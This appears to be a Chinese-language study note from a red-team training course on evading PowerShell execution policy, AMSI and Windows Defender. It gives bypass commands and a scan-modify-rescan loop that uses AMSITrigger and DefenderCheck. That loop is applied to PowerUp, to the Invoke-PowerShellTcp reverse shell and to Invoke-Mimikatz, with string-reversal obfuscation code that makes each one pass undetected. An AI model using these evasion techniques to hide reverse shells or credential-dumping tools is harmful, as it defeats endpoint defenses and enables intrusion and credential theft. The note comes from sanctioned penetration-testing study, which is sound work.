# 绕过powershell执行策略

```
powershell –ExecutionPolicy bypass

powershell –c <cmd>

powershell –encodedcommand

$env:PSExecutionPolicyPreference="bypass"
```

# Bypassing PowerShell Security(绕过powershell安全控制)

使用[Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)

如果有admin权限,使用
```
RunWithPathAsAdmin.bat
```

如果没有admin权限，使用
```
RunWithRegistryNonAdmin.bat
```

> • Type  exit from the new PowerShell session to complete the clean-up


# Bypassing AV Signatures for PowerShell(AV签名绕过)

使用[AMSITrigger](https://github.com/RythmStick/AMSITrigger)工具来确定被 AMSI 检测到的脚本的确切检测到的部分
```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```


使用[DefenderCheck](https://github.com/t3hbb/DefenderCheck)来识别Windows Defender的二进制文件中的代码和字符串
```
DefenderCheck.exe PowerUp.ps1
```


自动化混淆工具[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)


## AV签名绕过步骤

1. Scan using AMSITrigger(使用AMSITrigger进行扫描)
2. Modify the detected code snippet(修改检测到的代码片断)
3. Rescan using AMSITrigger(使用AMSITrigger重新扫描)
4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"(重复步骤2和3，直到我们得到一个 "AMSI_RESULT_NOT_DETECTED "或 "空白 "的结果。)



### PowerUp

1. AmsiTrigger_x64检查PowerUp

这里使用教材自带tools工具包里的```PowerUp_Old.ps1```

检查到有问题的代码
```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i  PowerUp_Old.ps1
[+] "= [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)"
```

修改思路为修改被检测到的字符串，这里是做了一个逆序字符串处理
```
$String = 'niamoDppA.metsyS'
$classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
$AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null, @())
```


修改完以后，再次检查，已无返回
```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i  PowerUp_Old.ps1

D:\BaiduNetdiskDownload\CRTE\Tools>
```

2. DefenderCheck检查PowerUp
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe PowerUp_Old.ps1

OriginalFileDetectionStatus is : ThreatFound
Target file size: 562959 bytes
Analyzing...

File matched signature: "HackTool:Win64/PowersploitHijack.A!dll"

[!] Identified end of bad bytes at offset 0x598EE in the original file
File matched signature: "HackTool:Win64/PowersploitHijack.A!dll"

00000000   6C 46 2F 46 59 7A 39 6A  6B 31 6F 42 31 42 41 48   lF/FYz9jk1oB1BAH
00000010   52 50 67 7A 33 45 48 6B  45 41 2F 6E 55 46 36 45   RPgz3EHkEA/nUF6E
00000020   38 70 41 41 43 68 78 42  35 42 41 49 50 34 2F 33   8pAAChxB5BAIP4/3
00000030   55 48 75 50 2F 2F 41 41  44 72 63 46 61 4E 54 66   UHuP//AADrcFaNTf
00000040   42 52 61 67 47 4E 54 51  68 52 55 50 38 56 44 4F   BRagGNTQhRUP8VDO
00000050   46 41 41 49 58 41 64 57  65 44 50 61 41 64 51 51   FAAIXAdWeDPaAdQQ
00000060   41 43 64 64 72 2F 46 52  6A 67 51 41 43 44 2B 48   ACddr/FRjgQACD+H
00000070   68 31 7A 34 6B 31 6F 42  31 42 41 46 5A 57 61 67   h1z4k1oB1BAFZWag
00000080   57 4E 52 66 52 51 61 67  47 4E 52 51 68 51 56 76   WNRfRQagGNRQhQVv
00000090   38 56 43 4F 46 41 41 46  44 2F 46 58 44 67 51 41   8VCOFAAFD/FXDgQA
000000A0   43 4C 44 63 51 65 51 51  43 44 2B 66 39 30 6F 6C   CLDcQeQQCD+f90ol
000000B0   61 4E 56 66 42 53 55 49  31 46 39 46 42 52 2F 78   aNVfBSUI1F9FBR/x
000000C0   55 45 34 55 41 41 68 63  42 30 6A 57 61 4C 52 51   UE4UAAhcB0jWaLRQ
000000D0   69 4C 54 66 77 7A 7A 56  37 6F 58 58 33 2F 2F 38   iLTfwzzV7oXX3//8
000000E0   6E 44 78 77 57 67 48 55  45 41 41 51 41 41 41 4F   nDxwWgHUEAAQAAAO
000000F0   76 6A 7A 4D 7A 4D 7A 4D  7A 4D 7A 4D 7A 4D 7A 4D   vjzMzMzMzMzMzMzM

```


思路也是逆序字符串,再次检查，已通过
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe PowerUp.ps1

OriginalFileDetectionStatus is : NoThreatFound
[+] No threat found in submitted file!
```

### Invoke-PowerShellTcp

1. AmsiTrigger_x64检查Invoke-PowerShellTcp

```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i Invoke-PowerShellTcp_Old.ps1
[+] "username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location)"
[+] "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()"
```

这里有点奇怪是检查到有问题的是上面的片段，但真正有问题的代码片段（按照教程所说）应该是
```
 if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }
```

需要逆序字符串替换成
```
 $String = "stekcoS.teN"
        $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
        if ($Reverse)
        {
            $client = New-Object System.$class.TCPClient($IPAddress,$Port)
        }
```

再次检查
```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i Invoke-PowerShellTcp_Old.ps1
[+] AMSI_RESULT_NOT_DETECTED
```

2. DefenderCheck.exe检查Invoke-PowerShellTcp

也是同一个地方报错

```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe Invoke-PowerShellTcp_Old.ps1

OriginalFileDetectionStatus is : ThreatFound
Target file size: 2985 bytes
Analyzing...

File matched signature: "Trojan:PowerShell/ReverseShell.SA"

[!] Identified end of bad bytes at offset 0xA84 in the original file
File matched signature: "Trojan:PowerShell/ReverseShell.SA"

00000000   20 20 20 20 20 20 20 24  65 72 72 6F 72 2E 63 6C          $error.cl
00000010   65 61 72 28 29 0D 0A 20  20 20 20 20 20 20 20 20   ear()··
00000020   20 20 20 24 73 65 6E 64  62 61 63 6B 32 20 3D 20      $sendback2 =
00000030   24 73 65 6E 64 62 61 63  6B 32 20 2B 20 24 78 0D   $sendback2 + $x·
00000040   0A 0D 0A 20 20 20 20 20  20 20 20 20 20 20 20 23   ···            #
00000050   52 65 74 75 72 6E 20 74  68 65 20 72 65 73 75 6C   Return the resul
00000060   74 73 0D 0A 20 20 20 20  20 20 20 20 20 20 20 20   ts··
00000070   24 73 65 6E 64 62 79 74  65 20 3D 20 28 5B 74 65   $sendbyte = ([te
00000080   78 74 2E 65 6E 63 6F 64  69 6E 67 5D 3A 3A 41 53   xt.encoding]::AS
00000090   43 49 49 29 2E 47 65 74  42 79 74 65 73 28 24 73   CII).GetBytes($s
000000A0   65 6E 64 62 61 63 6B 32  29 0D 0A 20 20 20 20 20   endback2)··
000000B0   20 20 20 20 20 20 20 24  73 74 72 65 61 6D 2E 57          $stream.W
000000C0   72 69 74 65 28 24 73 65  6E 64 62 79 74 65 2C 30   rite($sendbyte,0
000000D0   2C 24 73 65 6E 64 62 79  74 65 2E 4C 65 6E 67 74   ,$sendbyte.Lengt
000000E0   68 29 0D 0A 20 20 20 20  20 20 20 20 20 20 20 20   h)··
000000F0   24 73 74 72 65 61 6D 2E  46 6C 75 73 68 28 29 20   $stream.Flush()
```

同样方法修改后，再次检查，无报错
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe Invoke-PowerShellTcp_Old.ps1

OriginalFileDetectionStatus is : NoThreatFound
[+] No threat found in submitted file!
```

###  Invoke-Mimikatz 

按教材的说法，mimikatz是重点盯防对象，检查之前必须先把文件名修改，否则会报access denied（拒绝访问）

```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i Invoke-Mimikatz_old.ps1
拒绝访问。
```

修改文件名为```mimi.ps1```，再次检查
```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i mimi.ps1
[+] "Invoke-Mimikatz"
[+] "Invoke-ReflectivePEInjection"
[+] "in memory using PowerShell. Can be used to dump credentials without writing anything to disk"
[+] "Invoke-Mimikatz"
[+] "Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Mimikatz version: 2.1.1 (13/08/2017)


.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials"
[+] "Invoke-Mimikatz"
[+] "Invoke-Mimikatz"
[+] "Invoke-Mimikatz"
[+] "Invoke-ReflectivePEInjection"
[+] "Invoke-ReflectivePEInjection"
[+] "Invoke-ReflectivePEInjection"
[+] "$ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    ["
[+] "Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect"
[+] "Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory"
[+] ".CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0"
```


教材这边的修改策略是：

1. Remove the comments.（删除注释。）
2. Modify each use of "DumpCreds".(修改每一处"DumpCreds")
3. Modify the variable names of the Win32 API calls that are detected.(修改每一处Win32 API调用)
4. Reverse the strings that are detected and the Mimikatz Compressed DLL string.（将检测到的字符串和Mimikatz压缩的DLL字符串倒置）


修改以后再次检测
```
D:\BaiduNetdiskDownload\CRTE\Tools>AmsiTrigger_x64.exe -i mimi_new.ps1

D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe mimi_new.ps1

OriginalFileDetectionStatus is : NoThreatFound
[+] No threat found in submitted file!
```